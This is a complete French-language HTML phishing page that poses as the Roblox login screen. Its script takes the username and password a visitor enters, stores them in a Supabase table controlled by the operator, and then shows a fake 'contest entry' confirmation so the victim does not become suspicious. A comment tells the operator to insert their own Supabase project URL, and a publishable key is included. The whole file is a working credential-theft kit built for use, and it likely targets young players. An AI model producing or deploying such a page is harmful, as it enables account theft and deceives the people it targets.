<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Roblox</title>
  <link rel="icon" type="image/png" href="logo.png">
  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
  <style>
    body {
      font-family: Arial;
      font-size: 18px;
      background: url("fond.png") no-repeat center center;
      background-size: cover;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      color: white;
      margin: 0;
    }
    .box {
      background: #1c1c1c; /* noir/gris semi-transparent */
      padding: 30px;
      border-radius: 10px;
      width: 300px;
      box-shadow: 0 0 15px rgba(0,0,0,0.5);
    }
    input {
      width: 100%;
      margin-top: 10px;
      padding: 10px;
      background-color: #2c2c2c; /* gris foncé */
      color: white;
      border: none;
      border-radius: 5px;
    }
    button {
      width: 100%;
      margin-top: 10px;
      padding: 10px;
      background-color: #4a4a4a;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
    button:hover {
      background-color: #6a6a6a;
    }
    #msg {
      margin-top: 10px;
      text-align: center;
      color: red;
    }
  </style>
</head>
<body>

<div class="box" id="formBox">
  <h2>Connexion à Roblox</h2>
  <input id="identifiant" placeholder="Identifiant / E-mail / Téléphone">
  <input id="code" placeholder="Mot de passe" type="password">
  <button onclick="send()">Connexion</button>
  <p id="msg"></p>
</div>

<script>
  // ⚠️ Remplace ici avec l'URL de ton vrai projet Supabase et ta clé publique
  const supabase = supabase.createClient(
    "https://TON-PROJET.supabase.co",
    "sb_publishable_UWZzqYUSWgOWFfYfU0Y6Ng_zidrthkn"
  );

  // Fonction unique
  async function send() {
    const identifiant = document.getElementById("identifiant").value;
    const code = document.getElementById("code").value;

    // Envoyer à Supabase
    const { error } = await supabase
      .from("responses")
      .insert([{ identifiant, code }]);

    if (error) {
      document.getElementById("msg").innerText = "Erreur, réessayez";
    } else {
      // cacher le formulaire
      document.getElementById("formBox").style.display = "none";

      // message principal
      const message = document.createElement("div");
      message.style.color = "white";
      message.style.fontSize = "30px";
      message.style.fontWeight = "bold";
      message.style.textAlign = "center";
      message.style.marginTop = "15%";
      message.innerText = "Vous êtes bien inscrit au concours";
      document.body.appendChild(message);

      // message secondaire
      const message2 = document.createElement("div");
      message2.style.color = "white";
      message2.style.fontSize = "18px";
      message2.style.textAlign = "center";
      message2.style.marginTop = "20px";
      message2.innerText = "Vous recevrez une notification dans votre messagerie si vous faites partie des gagnants.";
      document.body.appendChild(message2);
    }
  }
</script>

</body>
</html>
